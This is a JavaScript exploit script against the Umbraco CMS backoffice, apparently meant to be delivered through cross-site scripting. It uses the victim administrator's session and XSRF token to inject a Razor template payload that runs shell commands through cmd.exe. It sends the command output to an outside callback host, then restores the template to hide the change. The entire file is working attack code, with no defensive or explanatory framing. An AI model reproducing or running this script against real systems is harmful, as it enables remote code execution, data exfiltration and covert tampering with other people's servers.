// Payload configuration
const cmd = "whoami";
const razorTemplateName = "Home";
const razorPayloadElementID = "umb-xss";
const triggerURL = "/";
const triggerHeaderName = "X-UMB";
const triggerHeaderValue = "1";
const callbackURL = "http://kali.umbsec.icu/";

(async function () {
  // Get template
  const allTemplates = await getJSON(
    "/umbraco/backoffice/UmbracoApi/Template/GetAll"
  );
  const homeTemplateStub = allTemplates.find((x) =>
    x.name.includes(razorTemplateName)
  );
  const homeTemplate = await getJSON(
    `/umbraco/backoffice/UmbracoApi/Template/GetById?id=${homeTemplateStub.id}`
  );

  // Save original template. It will be restored later on.
  const originalTemplate = homeTemplate.content;

  // Add payload to the end of the template
  homeTemplate.content += generatePayload();

  // Save template
  const saveTemplate = await postJSON(
    "/umbraco/backoffice/UmbracoApi/Template/PostSave",
    homeTemplate
  );

  // Hit URL to trigger command execution
  const triggerHeaders = {};
  triggerHeaders[triggerHeaderName] = triggerHeaderValue;
  const triggerURLResponse = await fetch(triggerURL, {
    headers: triggerHeaders,
  });

  // Get command output from HTML response
  const html = await triggerURLResponse.text();
  const parsedDocument = new DOMParser().parseFromString(html, "text/html");
  const commandOutputElement = parsedDocument.getElementById(
    razorPayloadElementID
  );

  // Send output to callback URL
  await fetch(callbackURL, {
    method: "POST",
    body: commandOutputElement.innerText,
  });

  // Reset to original template
  homeTemplate.content = originalTemplate;
  const resetTemplate = await postJSON(
    "/umbraco/backoffice/UmbracoApi/Template/PostSave",
    homeTemplate
  );

  /*
   * Helper Functions
   */

  function getCookie(name) {
    return (
      document.cookie.match("(^|;)\\s*" + name + "\\s*=\\s*([^;]+)")?.pop() ||
      ""
    );
  }

  async function getJSON(url) {
    var response = await fetch(url, {
      method: "GET",
      credentials: "include",
      headers: {
        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
      },
    });
    return fromJSON(await response.text());
  }

  async function postJSON(url, data) {
    var response = await fetch(url, {
      method: "POST",
      body: JSON.stringify(data),
      credentials: "include",
      headers: {
        "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
        "Content-Type": "application/json",
      },
    });
    return fromJSON(await response.text());
  }

  function fromJSON(responseText) {
    // Remove XSSI prevention prefix from response body before parsing
    return JSON.parse(responseText.slice(6));
  }

  function generatePayload() {
    return `
@if (Request.Headers["${triggerHeaderName}"] == "${triggerHeaderValue}")
{
    try
    {
        using (var process = new System.Diagnostics.Process())
        {
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c ${cmd}";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            <pre id="${razorPayloadElementID}">@output</pre>
        }
    }
    catch { }
}
`;
  }
})();
